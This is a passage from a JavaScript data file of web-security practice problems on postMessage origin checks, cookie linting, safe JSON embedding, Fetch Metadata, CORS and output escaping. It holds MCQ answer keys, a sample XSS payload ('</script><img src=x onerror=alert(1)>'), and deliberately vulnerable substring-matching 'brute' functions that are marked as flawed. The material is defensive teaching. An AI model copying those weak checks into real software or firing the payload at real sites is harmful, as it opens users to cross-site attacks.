      approach: `<p>Each connection is a tiny scheduler: it just remembers when it becomes free. Greedy assignment to the earliest-free connection reproduces browser behaviour for in-order requests. HTTP/2 under this latency-only model needs no scheduling at all.</p>`,
      code: {
        lang: 'js', run: true, code: `function stats(finish) {
  var total = Math.max.apply(null, finish);
  var sum = finish.reduce(function (a, b) { return a + b; }, 0);
  return { finish: finish, total: total, average: sum / finish.length };
}

function compare(sizes, conns) {
  var free = [];
  for (var c = 0; c < conns; c++) free.push(0);
  var f1 = [];
  sizes.forEach(function (s) {
    var best = 0;
    for (var k = 1; k < conns; k++) if (free[k] < free[best]) best = k;   // earliest free, lowest index on ties
    free[best] += s;
    f1.push(free[best]);
  });
  var f2 = sizes.slice();                                                   // all streams start at 0
  return { h1: stats(f1), h2: stats(f2) };
}

var r = compare([3, 1, 2, 1, 4, 1, 2, 2], 3);
console.log('HTTP/1.1', JSON.stringify(r.h1));
console.log('HTTP/2  ', JSON.stringify(r.h2));
var r2 = compare([5, 5, 5, 5], 2);
console.log('equal big files, 2 conns:', r2.h1.total, 'vs', r2.h2.total);`
      },
      dry: {
        head: ['request', 'size', 'free[] before', 'chosen conn', 'finish (HTTP/1.1)'],
        rows: [
          ['A', '3', '[0,0,0]', '0', '3'],
          ['B', '1', '[3,0,0]', '1', '1'],
          ['C', '2', '[3,1,0]', '2', '2'],
          ['D', '1', '[3,1,2]', '1', '2']
        ]
      },
      complexity: `<p>O(n · conns) time, O(conns) extra space (O(n log conns) with a heap).</p>`,
      followUps: ['How would you model shared bandwidth so HTTP/2 streams slow each other down?', 'How would priorities (render-blocking CSS first) change the order of the input?']
    }
  }]
});

/* ============================ PRACTICE ============================ */

/* ---- Easy 1 ---- */
practice.push({
  title: 'postMessage Origin Guard', level: 'Easy', tags: ['postMessage', 'same-origin', 'validation'], companies: ['Google', 'Stripe'],
  statement: `<p>Write <code>acceptMessage(event, trustedOrigins, allowedTypes)</code> for a <code>message</code> event handler. Return <code>event.data</code> only if (1) <code>event.origin</code> is <b>exactly</b> one of <code>trustedOrigins</code>, (2) <code>event.data</code> is a non-null object, and (3) <code>event.data.type</code> is one of <code>allowedTypes</code>. Otherwise return <code>null</code>.</p>`,
  constraints: `<code>trustedOrigins</code> has up to 20 entries. Origins are full strings like <code>https://widgets.example.com</code>.`,
  example: `${H.table(['event.origin', 'event.data', 'Result'], [['https://widgets.example.com', '{type:"resize", height:300}', H.c('g', 'accepted')], ['https://widgets.example.com.evil.io', '{type:"resize"}', H.c('r', 'null: not an exact match')], ['https://widgets.example.com', '"hello"', H.c('r', 'null: data is not an object')], ['https://widgets.example.com', '{type:"deleteAll"}', H.c('r', 'null: type not allowed')]])}`,
  brute: {
    why: `<p>The tempting check is <code>event.origin.indexOf('example.com') !== -1</code> or <code>endsWith('example.com')</code>. Both accept attacker domains such as <code>example.com.evil.io</code> or <code>evilexample.com</code>. Origins must be compared as whole strings.</p>`,
    code: `function acceptBrute(event) {
  // Substring check: accepts https://example.com.evil.io and https://evilexample.com
  return event.origin.indexOf('example.com') !== -1 ? event.data : null;
}`
  },
  mcq: { q: 'Which postMessage call is the safe way to send a message to a known partner iframe?', options: ['frame.contentWindow.postMessage(data, "*")', 'frame.contentWindow.postMessage(data, "https://partner.example")', 'window.postMessage(data)', 'frame.postMessage(data, location.origin)'], answer: 1, explain: 'Naming the exact target origin makes the browser deliver the message only if the frame currently shows that origin. "*" would deliver it to whatever page happens to be there (for example after a navigation).' },
  hints: [
    `<p>Hint 1: <code>event.origin</code> is set by the browser and cannot be forged by the sender, so it is the one trustworthy field. Everything in <code>event.data</code> is untrusted input.</p>`,
    `<p>Hint 2: Use exact membership (<code>indexOf(...) !== -1</code> on the array of whole origins, or a <code>Set</code>), never substring or suffix matching.</p>`,
    `<p>Hint 3: Recipe: check origin \u2192 check data is an object \u2192 check type is allowed \u2192 return data, otherwise <code>null</code> at the first failed check.</p>`
  ],
  solution: {
    approach: `<p>Three cheap checks in order: who sent it (exact origin), what shape (object), what kind (allowlisted type). Fail closed by returning <code>null</code>.</p>`,
    code: { lang: 'js', run: true, code: `function acceptMessage(event, trustedOrigins, allowedTypes) {
  if (!event || typeof event.origin !== 'string') return null;
  if (trustedOrigins.indexOf(event.origin) === -1) return null;      // exact string match
  var d = event.data;
  if (d === null || typeof d !== 'object') return null;
  if (allowedTypes.indexOf(d.type) === -1) return null;
  return d;
}

var trusted = ['https://widgets.example.com'];
var types = ['resize', 'ready'];
console.log(acceptMessage({ origin: 'https://widgets.example.com', data: { type: 'resize', height: 300 } }, trusted, types));
console.log(acceptMessage({ origin: 'https://widgets.example.com.evil.io', data: { type: 'resize' } }, trusted, types));
console.log(acceptMessage({ origin: 'https://widgets.example.com', data: 'hello' }, trusted, types));
console.log(acceptMessage({ origin: 'https://widgets.example.com', data: { type: 'deleteAll' } }, trusted, types));` },
    dry: { head: ['origin', 'origin ok?', 'data object?', 'type ok?', 'result'], rows: [['widgets.example.com', 'yes', 'yes', 'resize ok', 'data'], ['widgets.example.com.evil.io', 'no', '-', '-', 'null'], ['widgets.example.com', 'yes', 'no (string)', '-', 'null']] },
    complexity: `<p>O(T + A) for T trusted origins and A allowed types; both are small constants.</p>`,
    followUps: ['How would you reply safely to the sender?', 'Why is event.source also worth checking?']
  }
});

/* ---- Easy 2 ---- */
practice.push({
  title: 'Cookie Header Linter', level: 'Easy', tags: ['cookies', 'SameSite', 'HttpOnly', 'Secure', 'linting'], companies: ['Cloudflare', 'Okta'],
  statement: `<p>Write <code>lintSetCookie(header)</code> that takes the value of a <code>Set-Cookie</code> header (for example <code>sid=abc; Path=/; Secure</code>) and returns an array of problem strings (empty array = no problems). Report: <code>'missing Secure'</code>; <code>'missing HttpOnly'</code> when the cookie name contains <code>sess</code>, <code>sid</code>, <code>token</code> or <code>auth</code> (case-insensitive); <code>'missing SameSite'</code>; <code>'SameSite=None requires Secure'</code>; <code>'Domain widens the cookie to all subdomains'</code>; and <code>'__Host- prefix needs Secure, Path=/ and no Domain'</code> when the name starts with <code>__Host-</code> but breaks that rule. Attribute names are case-insensitive.</p>`,
  constraints: `Header length up to 4096 characters. Attributes are separated by <code>;</code>.`,
  example: `${H.table(['Header', 'Problems'], [['<code>sid=1; Path=/</code>', 'missing Secure, missing HttpOnly, missing SameSite'], ['<code>sid=1; Secure; HttpOnly; SameSite=Lax</code>', H.c('g', '(none)')], ['<code>theme=dark; Secure; SameSite=None</code>', H.c('g', '(none: Secure is set, theme is not sensitive)')], ['<code>a=1; SameSite=None</code>', 'missing Secure, SameSite=None requires Secure']])}`,
  brute: {
    why: `<p>Using <code>header.indexOf('Secure') !== -1</code> is wrong in two ways: it is case-sensitive, and it matches inside a value or name (a cookie called <code>InsecureMode=1</code> contains "Secure"). Attributes must be parsed into names first.</p>`,
    code: `function lintBrute(header) {
  var problems = [];
  // Substring checks: fooled by cookie names/values and by letter case
  if (header.indexOf('Secure') === -1) problems.push('missing Secure');
  if (header.indexOf('HttpOnly') === -1) problems.push('missing HttpOnly');
  return problems;
}`
  },
  mcq: { q: 'A cookie header has "SameSite=None" but no "Secure". What happens in modern browsers?', options: ['It works normally', 'The browser rejects the cookie', 'It becomes SameSite=Lax silently', 'It becomes HttpOnly'], answer: 1, explain: 'Cookies with SameSite=None must also be Secure; otherwise Chrome, Firefox and Safari reject them. That is why the linter reports it.' },
  hints: [
    `<p>Hint 1: Split the header on <code>;</code>, trim each piece. The first piece is <code>name=value</code>, the rest are attributes (some with <code>=value</code>, some without).</p>`,
    `<p>Hint 2: Build a lookup object <code>attrs</code> keyed by lower-cased attribute name, so you can ask <code>'secure' in attrs</code> and read <code>attrs.samesite</code>.</p>`,
    `<p>Hint 3: Recipe: parse name and attrs \u2192 push problems in the order of the statement \u2192 for the <code>__Host-</code> prefix test <code>secure</code>, <code>path === '/'</code> and no <code>domain</code> together.</p>`
  ],
  solution: {
    approach: `<p>Parse once into a small model (name plus attribute map), then each rule is a one-line check on that model. Rules stay independent, so adding a new one later is trivial.</p>`,
    code: { lang: 'js', run: true, code: `function lintSetCookie(header) {
  var pieces = header.split(';').map(function (p) { return p.trim(); }).filter(Boolean);
  var first = pieces.shift() || '';
  var name = first.split('=')[0];
  var attrs = {};
  pieces.forEach(function (p) {
    var i = p.indexOf('=');
    var key = (i === -1 ? p : p.slice(0, i)).trim().toLowerCase();
    attrs[key] = i === -1 ? true : p.slice(i + 1).trim();
  });

  var problems = [];
  var secure = 'secure' in attrs;
  if (!secure) problems.push('missing Secure');
  if (/sess|sid|token|auth/i.test(name) && !('httponly' in attrs)) problems.push('missing HttpOnly');
  if (!('samesite' in attrs)) problems.push('missing SameSite');
  if (String(attrs.samesite).toLowerCase() === 'none' && !secure) problems.push('SameSite=None requires Secure');
  if ('domain' in attrs) problems.push('Domain widens the cookie to all subdomains');
  if (name.indexOf('__Host-') === 0 && !(secure && attrs.path === '/' && !('domain' in attrs))) {
    problems.push('__Host- prefix needs Secure, Path=/ and no Domain');
  }
  return problems;
}

console.log(lintSetCookie('sid=1; Path=/'));
console.log(lintSetCookie('sid=1; Secure; HttpOnly; SameSite=Lax'));
console.log(lintSetCookie('theme=dark; Secure; SameSite=None'));
console.log(lintSetCookie('a=1; SameSite=None'));
console.log(lintSetCookie('__Host-sid=1; Secure; HttpOnly; SameSite=Lax; Domain=shop.com'));` },
    dry: { head: ['Header', 'parsed attrs', 'problems'], rows: [['sid=1; Path=/', 'path', 'Secure, HttpOnly, SameSite'], ['theme=dark; Secure; SameSite=None', 'secure, samesite=None', 'none'], ['a=1; SameSite=None', 'samesite=None', 'Secure, None needs Secure']] },
    complexity: `<p>O(L) in the header length.</p>`,
    followUps: ['Add a rule for very long Max-Age on session cookies.', 'How would you run this linter against every cookie your site sets in a CI end-to-end test?']
  }
});

/* ---- Easy 3 ---- */
practice.push({
  title: 'Embed JSON in a Script Tag Safely', level: 'Easy', tags: ['XSS', 'JSON', 'SSR', 'escaping'], companies: ['Airbnb', 'Shopify'],
  statement: `<p>Server-side rendered pages often embed initial data like <code>&lt;script&gt;window.__DATA__ = {...};&lt;/script&gt;</code>. If a string inside the data contains the characters that close the script tag, the page is vulnerable to XSS. Write <code>jsonForScript(value)</code> that returns <code>JSON.stringify(value)</code> with <code>&lt;</code>, <code>&gt;</code> and <code>&amp;</code> replaced by the JavaScript escapes <code>\\u003c</code>, <code>\\u003e</code>, <code>\\u0026</code> and the line separators U+2028 / U+2029 replaced by <code>\\u2028</code> / <code>\\u2029</code>. The result must still parse (via <code>JSON.parse</code>) back to the original value.</p>`,
  constraints: `Value is any JSON-serialisable data. Output length is at most a few times the JSON length.`,
  example: `<p>Input <code>{ "bio": "&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;" }</code></p><p>Output (as text): <code>{"bio":"\\u003c/script\\u003e\\u003cimg src=x onerror=alert(1)\\u003e"}</code></p><p>Why: the HTML parser ends a script block at the first closing script tag, no matter where it sits inside a JS string. After escaping there is no literal <code>&lt;</code> left, but the JavaScript engine still reads <code>\\u003c</code> as <code>&lt;</code>.</p>`,
  brute: {
    why: `<p>Plain <code>JSON.stringify</code> is a valid JS literal but not safe inside HTML: it leaves <code>&lt;/script&gt;</code> intact. HTML-escaping the whole string instead (<code>&amp;lt;</code>) <em>changes the data</em>, because inside a script block entities are not decoded.</p>`,
    code: `function jsonBrute(value) {
  // Valid JSON, but "<\/script>" inside a string still terminates the script element
  return JSON.stringify(value);
}`
  },
  mcq: { q: 'Why can HTML-escaping JSON (replacing < with &lt;) NOT be used inside an inline script block?', options: ['Script contents are not HTML-decoded, so the data would be wrong', 'Browsers forbid entities', 'It is too slow', 'JSON cannot contain < at all'], answer: 0, explain: 'Inside a script element the contents are raw text. Entities are never decoded there, so the JavaScript would see the literal &lt; text. Use JavaScript escapes (\\u003c) instead.' },
  hints: [
    `<p>Hint 1: Only the characters <code>&lt;</code> (could start a closing tag or a comment), <code>&gt;</code>, <code>&amp;</code> and the two Unicode line separators need escaping; everything else can stay.</p>`,
    `<p>Hint 2: Replace them with the six-character JS escape sequences. A JSON string accepts <code>\\uXXXX</code> in place of any character, so parsing still gives the original value.</p>`,
    `<p>Hint 3: To avoid writing backslashes in your regex, build the replacement from <code>String.fromCharCode(92)</code> (a backslash). Replace with a single <code>replace(/[&lt;&gt;&amp;]/g, fn)</code> and a second pass for U+2028 and U+2029.</p>`
  ],
  solution: {
    approach: `<p>Stringify first (so quoting is right), then escape the dangerous characters in the finished text. Because those characters can only appear inside string values in valid JSON, rewriting them as <code>\\uXXXX</code> never changes the parsed data.</p>`,
    code: { lang: 'js', run: true, code: `var BS = String.fromCharCode(92);              // a single backslash
function hex4(ch) { return BS + 'u' + ('0000' + ch.charCodeAt(0).toString(16)).slice(-4); }

function jsonForScript(value) {
  var text = JSON.stringify(value);
  return text
    .replace(/[<>&]/g, hex4)
    .replace(new RegExp('[' + String.fromCharCode(0x2028, 0x2029) + ']', 'g'), hex4);
}

var data = { bio: '<\/script><img src=x onerror=alert(1)>', note: 'a & b', sep: String.fromCharCode(0x2028) };
var out = jsonForScript(data);
console.log(out);
console.log('contains raw < ? ' + (out.indexOf('<') !== -1));
console.log('round trip ok ? ' + (JSON.stringify(JSON.parse(out)) === JSON.stringify(data)));` },
    dry: { head: ['char in string', 'escape', 'why'], rows: [['&lt;', 'u003c', 'could start a closing script tag'], ['&gt;', 'u003e', 'defence in depth'], ['&', 'u0026', 'entity tricks in XML-ish contexts'], ['U+2028', 'u2028', 'line terminator in old JS parsers']] },
    complexity: `<p>O(n) in the JSON text length, two passes.</p>`,
    followUps: ['Why is putting data in a data-* attribute or a JSON script type="application/json" block a good alternative?', 'Which contexts still need different escaping?']
  }
});

/* ---- Easy 4 ---- */
practice.push({
  title: 'Fetch Metadata Request Guard', level: 'Easy', tags: ['Sec-Fetch-Site', 'CSRF', 'XS-Leaks'], companies: ['Google', 'Cloudflare'],
  statement: `<p>Implement <code>fetchMetadataAllows(method, headers)</code>, a "resource isolation policy". <code>headers</code> is an object with lower-case keys. Rules: (1) if <code>sec-fetch-site</code> is missing (old browser), allow; (2) <code>same-origin</code> and <code>none</code> (typed URL or bookmark) are allowed; (3) otherwise (<code>same-site</code> or <code>cross-site</code>) allow only when the method is GET or HEAD <b>and</b> <code>sec-fetch-mode</code> is <code>navigate</code> <b>and</b> <code>sec-fetch-dest</code> is <code>document</code> (a plain top-level link click); reject everything else.</p>`,
  constraints: `Header values are lower-case strings.`,
  example: `${H.table(['Request', 'Allowed?'], [['POST, site=cross-site, mode=cors', H.c('r', 'no')], ['GET, site=cross-site, mode=navigate, dest=document', H.c('g', 'yes: user clicked a link')], ['GET, site=cross-site, mode=no-cors, dest=image', H.c('r', 'no: hotlinked image or XS-Leak probe')], ['DELETE, site=same-origin', H.c('g', 'yes')], ['POST, (no sec-fetch-site header)', H.c('g', 'yes: legacy client, other defences must cover it')]])}`,
  brute: {
    why: `<p>Checking the <code>Referer</code> or <code>Origin</code> header text is the older approach. <code>Referer</code> can be stripped by privacy settings and <code>Referrer-Policy</code>, and parsing it invites the same substring bugs as origin checks. <code>Sec-Fetch-*</code> values are set by the browser and cannot be changed by page JavaScript.</p>`,
    code: `function guardBrute(headers) {
  // Fragile: Referer is optional and spoofable by non-browser clients
  return !headers.referer || headers.referer.indexOf('https://app.example.com') === 0;
}`
  },
  mcq: { q: 'Which statement about Sec-Fetch-Site is true?', options: ['JavaScript on the page can set it to any value', 'The browser sets it and page scripts cannot override it', 'It is only sent on POST', 'It contains the full URL of the page'], answer: 1, explain: 'Headers with the Sec- prefix are "forbidden header names": only the browser sets them, so a server can trust them for browser traffic (non-browser clients can send anything, but they are not CSRF victims).' },
  hints: [
    `<p>Hint 1: Three questions in order: is the header missing? is the request same-origin or direct? otherwise is it a plain top-level GET navigation?</p>`,
    `<p>Hint 2: <code>none</code> means the user typed the URL or used a bookmark; it is as safe as same-origin.</p>`,
    `<p>Hint 3: Recipe: <code>site = headers['sec-fetch-site']</code>; return true if undefined; true if site is same-origin or none; else return the AND of the three navigation conditions.</p>`
  ],
  solution: {
    approach: `<p>A tiny decision tree on three browser-set headers. It blocks cross-site state-changing requests and cross-site embeds of your APIs, while still allowing normal link clicks.</p>`,
    code: { lang: 'js', run: true, code: `function fetchMetadataAllows(method, headers) {
  var site = headers['sec-fetch-site'];
  if (site === undefined) return true;                          // legacy browser: rely on other defences
  if (site === 'same-origin' || site === 'none') return true;   // our own pages, or typed URL / bookmark
  var m = String(method).toUpperCase();
  return (m === 'GET' || m === 'HEAD') &&
    headers['sec-fetch-mode'] === 'navigate' &&
    headers['sec-fetch-dest'] === 'document';                   // cross-site/same-site: only a real link click
}

console.log(fetchMetadataAllows('POST', { 'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'cors' }));
console.log(fetchMetadataAllows('GET', { 'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'navigate', 'sec-fetch-dest': 'document' }));
console.log(fetchMetadataAllows('GET', { 'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'no-cors', 'sec-fetch-dest': 'image' }));
console.log(fetchMetadataAllows('DELETE', { 'sec-fetch-site': 'same-origin' }));
console.log(fetchMetadataAllows('POST', {}));` },
    dry: { head: ['request', 'site', 'rule hit', 'result'], rows: [['POST cors', 'cross-site', 'rule 3 fails', 'false'], ['GET navigate document', 'cross-site', 'rule 3 passes', 'true'], ['DELETE', 'same-origin', 'rule 2', 'true']] },
    complexity: `<p>Constant time, O(1) per request.</p>`,
    followUps: ['How would you allow a specific partner site to call one public endpoint?', 'What extra checks do you keep for legacy clients without Sec-Fetch headers?']
  }
});

/* ---- Medium 5 ---- */
practice.push({
  title: 'Can This Page Read the Response? (CORS Check)', level: 'Medium', tags: ['CORS', 'credentials', 'headers'], companies: ['Google', 'Atlassian', 'Twilio'],
  statement: `<p>Write <code>canRead(pageOrigin, requestUrl, withCredentials, headers)</code> mirroring what the browser decides after a cross-origin <code>fetch</code>. <code>headers</code> is the response header object (names in any case). Return <code>{ readable, reason }</code>. Rules: if <code>requestUrl</code> is same-origin as <code>pageOrigin</code>, always readable. Otherwise <code>Access-Control-Allow-Origin</code> (ACAO) must be present and contain a single value (no comma). If it is <code>*</code>, the response is readable only when <code>withCredentials</code> is false. If it equals <code>pageOrigin</code> exactly, it is readable when credentials are not used or <code>Access-Control-Allow-Credentials</code> is exactly <code>true</code>. Any other value is not readable.</p>`,
  constraints: `Origins are normalised strings like <code>https://app.example.com</code>. Header values are strings.`,
  example: `${H.table(['Page / request', 'credentials', 'Response headers', 'Result'], [['app.example.com \u2192 api.example.com', 'no', 'ACAO: *', H.c('g', 'readable')], ['same', 'yes', 'ACAO: *', H.c('r', 'not readable: wildcard with credentials')], ['same', 'yes', 'ACAO: https://app.example.com + ACAC: true', H.c('g', 'readable')], ['same', 'yes', 'ACAO: https://app.example.com (no ACAC)', H.c('r', 'not readable')], ['same', 'no', '(no ACAO)', H.c('r', 'not readable')]])}`,
  brute: {
    why: `<p>The shortcut "if the response has any <code>Access-Control-Allow-Origin</code> header, it is readable" ignores the wildcard-with-credentials rule, the exact-match rule and the <code>Allow-Credentials</code> requirement, so you would predict success where the browser actually fails (and miss the real cause of the error).</p>`,
    code: `function canReadBrute(headers) {
  // Any ACAO header at all counts as success: wrong for credentials and for other origins
  return Object.keys(headers).some(function (k) { return k.toLowerCase() === 'access-control-allow-origin'; });
}`
  },
  mcq: { q: 'fetch(url, {credentials:"include"}) gets "Access-Control-Allow-Origin: *". What does the browser do?', options: ['Delivers the response', 'Blocks it: a wildcard is not accepted for credentialed requests', 'Retries without cookies', 'Asks the user'], answer: 1, explain: 'For credentialed requests the server must name the exact origin and send Access-Control-Allow-Credentials: true. A wildcard is rejected.' },
  hints: [
    `<p>Hint 1: Normalise header names to lower case first, so lookups are case-insensitive like in HTTP.</p>`,
    `<p>Hint 2: Handle the cases in a strict order: same-origin, missing ACAO, multiple values, wildcard, exact match, anything else. Return a human-readable reason each time.</p>`,
    `<p>Hint 3: For the same-origin test use the URL class: <code>new URL(requestUrl).origin === pageOrigin</code>.</p>`
  ],
  solution: {
    approach: `<p>A straight decision list that mirrors the Fetch standard\u2019s CORS check. Returning a <code>reason</code> turns it into a debugging helper for real CORS errors.</p>`,
    code: { lang: 'js', run: true, code: `function canRead(pageOrigin, requestUrl, withCredentials, headers) {
  if (new URL(requestUrl).origin === pageOrigin) return { readable: true, reason: 'same-origin' };
  var h = {};
  Object.keys(headers).forEach(function (k) { h[k.toLowerCase()] = headers[k]; });
  var acao = h['access-control-allow-origin'];
  if (acao === undefined) return { readable: false, reason: 'no Access-Control-Allow-Origin header' };
  if (acao.indexOf(',') !== -1) return { readable: false, reason: 'ACAO must be a single value' };
  if (acao === '*') {
    return withCredentials ? { readable: false, reason: 'wildcard not allowed with credentials' } : { readable: true, reason: 'wildcard, no credentials' };
  }
  if (acao !== pageOrigin) return { readable: false, reason: 'ACAO names a different origin' };
  if (withCredentials && h['access-control-allow-credentials'] !== 'true') return { readable: false, reason: 'missing Access-Control-Allow-Credentials: true' };
  return { readable: true, reason: 'origin allowed' };
}

var page = 'https://app.example.com', url = 'https://api.example.com/data';
console.log(canRead(page, url, false, { 'Access-Control-Allow-Origin': '*' }));
console.log(canRead(page, url, true, { 'access-control-allow-origin': '*' }));
console.log(canRead(page, url, true, { 'Access-Control-Allow-Origin': page, 'Access-Control-Allow-Credentials': 'true' }));
console.log(canRead(page, url, true, { 'Access-Control-Allow-Origin': page }));
console.log(canRead(page, url, false, {}));
console.log(canRead(page, 'https://app.example.com/api', false, {}));` },
    dry: { head: ['case', 'ACAO', 'credentials', 'decision'], rows: [['wildcard, no creds', '*', 'no', 'readable'], ['wildcard + creds', '*', 'yes', 'blocked'], ['exact + ACAC true', 'page origin', 'yes', 'readable'], ['exact, no ACAC', 'page origin', 'yes', 'blocked']] },
    complexity: `<p>O(H) to normalise H header names; the decision itself is O(1).</p>`,
    followUps: ['Add the preflight step: when must the answer to OPTIONS be checked first?', 'Add Access-Control-Expose-Headers: which response headers can the script read?']
  }
});

/* ---- Medium 6 ---- */
practice.push({
  title: 'Safe CORS Origin Allowlist Matcher', level: 'Medium', tags: ['CORS', 'allowlist', 'security bug'], companies: ['Meta', 'Shopify', 'GitHub'],
  statement: `<p>Write <code>isAllowedOrigin(origin, allowed)</code> for a server that echoes <code>Access-Control-Allow-Origin</code> only for trusted origins. <code>allowed</code> is an array of exact origins (<code>https://app.example.com</code>) and wildcard-subdomain patterns (<code>https://*.example.com</code>). A wildcard matches one or more subdomain labels but <b>not</b> the bare domain, and scheme and port must match exactly (no port means the default). The value must be a pure origin: no path, query, user-info, or trailing slash. <code>'null'</code> is never allowed.</p>`,
  constraints: `Up to 50 patterns. Input is whatever the client put in the Origin header, so treat it as hostile.`,
  example: `${H.table(['Origin', 'Result', 'Why'], [['https://app.example.com', H.c('g', 'allowed (exact)'), 'in the list'], ['https://a.b.example.com', H.c('g', 'allowed'), 'matches https://*.example.com'], ['https://example.com', H.c('r', 'denied'), 'wildcard needs a subdomain'], ['https://evil-example.com', H.c('r', 'denied'), 'not a subdomain, just a similar name'], ['https://example.com.evil.io', H.c('r', 'denied'), 'host does not end in .example.com'], ['http://a.example.com', H.c('r', 'denied'), 'scheme differs'], ['null', H.c('r', 'denied'), 'opaque origin']])}`,
  brute: {
    why: `<p>The classic vulnerable implementations: <code>/example\\.com$/.test(origin)</code> (accepts <code>evil-example.com</code>), <code>origin.indexOf('example.com') &gt; -1</code> (accepts <code>example.com.evil.io</code>), or reflecting any origin. With credentials enabled, any of these lets an attacker\u2019s site read your users\u2019 private data.</p>`,
    code: `function allowedBrute(origin) {
  // Both flaws in one line: suffix match without a dot boundary, and no scheme check
  return /example\\.com$/.test(origin);
}`
  },
  mcq: { q: 'Which origin does the check origin.endsWith("example.com") wrongly accept?', options: ['https://app.example.com', 'https://example.com', 'https://notexample.com', 'https://example.com:8443'], answer: 2, explain: 'notexample.com ends with the text "example.com" but is a different registrable domain. Always require the dot boundary (".example.com") or an exact match.' },
  hints: [
    `<p>Hint 1: Do not match text patterns on the raw string. Parse the origin with <code>new URL</code>, then compare scheme, host and port separately.</p>`,
    `<p>Hint 2: Reject the value if <code>u.origin !== origin</code> (that catches paths, user-info and trailing slashes) or if it is <code>'null'</code>.</p>`,
    `<p>Hint 3: Wildcard rule: pattern host is <code>*.base</code>; the candidate host must end with <code>'.' + base</code> and have at least one character before that dot. Also compare scheme and port from the parsed pattern.</p>`
  ],
  solution: {
    approach: `<p>Canonicalise with the URL parser, then compare the parts. The dot-boundary check is the heart of safe suffix matching.</p>`,
    code: { lang: 'js', run: true, code: `function parseOrigin(s) {
  try {
    var u = new URL(s);
    if (u.origin === 'null' || u.origin !== s) return null;     // rejects paths, user-info, trailing slash
    return u;
  } catch (e) { return null; }
}

function isAllowedOrigin(origin, allowed) {
  var o = parseOrigin(origin);
  if (!o) return false;
  for (var i = 0; i < allowed.length; i++) {
    var pat = allowed[i];
    if (pat.indexOf('*.') === -1) {                              // exact pattern
      if (pat === o.origin) return true;
      continue;
    }
    var p = new URL(pat.replace('*.', 'wildcard.'));              // parse scheme/host/port with a placeholder label
    var base = p.hostname.slice('wildcard.'.length);
    var okHost = o.hostname.length > base.length + 1 && o.hostname.slice(-(base.length + 1)) === '.' + base;
    if (okHost && o.protocol === p.protocol && o.port === p.port) return true;
  }
  return false;
}

var allowed = ['https://app.example.com', 'https://*.example.com'];
['https://app.example.com', 'https://a.b.example.com', 'https://example.com', 'https://evil-example.com',
 'https://example.com.evil.io', 'http://a.example.com', 'https://a.example.com:8443', 'https://a.example.com/x', 'null']
  .forEach(function (o) { console.log(o.padEnd(32) + isAllowedOrigin(o, allowed)); });` },
    dry: { head: ['origin', 'parsed host', 'boundary check', 'result'], rows: [['https://a.b.example.com', 'a.b.example.com', 'ends with .example.com', 'true'], ['https://evil-example.com', 'evil-example.com', 'no dot before example.com', 'false'], ['https://example.com', 'example.com', 'no label before', 'false']] },
    complexity: `<p>O(P) patterns per request; each check is O(host length).</p>`,
    followUps: ['How would you cache parsed patterns instead of re-parsing per request?', 'What response header must you add when you echo the matched origin?']
  }
});

/* ---- Medium 7 ---- */
practice.push({
  title: 'Escape for the Right Context', level: 'Medium', tags: ['XSS', 'output encoding', 'contexts'], companies: ['Google', 'Intuit'],
  statement: `<p>Write <code>escapeForContext(value, ctx)</code> where <code>ctx</code> is <code>'html'</code> (text between tags), <code>'attr'</code> (inside a <b>quoted</b> attribute), <code>'js'</code> (inside a quoted JavaScript string literal) or <code>'url'</code> (one query-string component). Rules: html and attr replace <code>&amp; &lt; &gt; " '</code> with entities (attr also escapes the backtick as <code>&amp;#96;</code>); js keeps ASCII letters, digits and space and writes every other character as <code>\\xHH</code> (code below 256) or <code>\\uHHHH</code>; url uses <code>encodeURIComponent</code> and additionally percent-encodes <code>! ' ( ) *</code>. Throw an Error for an unknown context.</p>`,
  constraints: `Input is any string. Output must be safe inside its context.`,
  example: `${H.table(['value', 'ctx', 'Output'], [['<code>&lt;b&gt;&amp;</code>', 'html', '<code>&amp;lt;b&amp;gt;&amp;amp;</code>'], ['<code>"x" onfocus="y</code>', 'attr', '<code>&amp;quot;x&amp;quot; onfocus=&amp;quot;y</code>'], ['<code>it\'s; ok</code>', 'js', 'the apostrophe and semicolon become hex escapes (<code>x27</code>, <code>x3b</code>)'], ['<code>a b&amp;c=d</code>', 'url', '<code>a%20b%26c%3Dd</code>']])}`,
  brute: {
    why: `<p>Using one escaper everywhere is the common mistake. HTML-escaping a value inside a JavaScript string does not stop <code>\\</code> or a newline from breaking out of the literal; <code>encodeURIComponent</code> in an HTML text context leaves <code>&amp;</code>-like text unprotected for some payloads. Each context has its own dangerous characters.</p>`,
    code: `function escapeBrute(value) {
  // One-size-fits-all HTML escape used for everything, including JS strings and URLs
  return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}`
  },
  mcq: { q: 'A value goes inside onclick="show(\'VALUE\')". Which defence is sufficient?', options: ['HTML-escape only', 'JS-string-escape first, then HTML-attribute-escape (two layers)', 'encodeURIComponent only', 'Nothing: quotes in the attribute protect it'], answer: 1, explain: 'The browser decodes HTML entities in the attribute first and then runs the result as JavaScript. You need the JS-string escape for the inner context and the HTML escape for the outer one. Better still: avoid inline handlers and use addEventListener with data-* attributes.' },
  hints: [
    `<p>Hint 1: Write one small function per context and dispatch on <code>ctx</code>. The contexts do not share one correct answer.</p>`,
    `<p>Hint 2: For <code>js</code>, an allowlist is safer than a blocklist: keep only <code>[A-Za-z0-9 ]</code> and escape everything else, so unknown dangerous characters are covered automatically.</p>`,
    `<p>Hint 3: Hex-escape with <code>charCodeAt(0).toString(16)</code> padded to 2 digits (<code>\\x</code>) or 4 digits (<code>\\u</code>). Use <code>String.fromCharCode(92)</code> for the backslash if you want to avoid escaping headaches in your own source.</p>`
  ],
  solution: {
    approach: `<p>Dispatch on context. HTML and attribute contexts share the entity map; JavaScript uses an allowlist-and-hex approach; URLs use <code>encodeURIComponent</code> plus the few characters it leaves alone.</p>`,
    code: { lang: 'js', run: true, code: `var BS = String.fromCharCode(92);                       // backslash
var ENT = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '\`': '&#96;' };

function pad(s, n) { return ('0000' + s).slice(-n); }

function escapeForContext(value, ctx) {
  var s = String(value);
  if (ctx === 'html') return s.replace(/[&<>"']/g, function (c) { return ENT[c]; });
  if (ctx === 'attr') return s.replace(/[&<>"'\`]/g, function (c) { return ENT[c]; });
  if (ctx === 'js') {
    var out = '';
    for (var i = 0; i < s.length; i++) {
      var ch = s.charAt(i), code = s.charCodeAt(i);
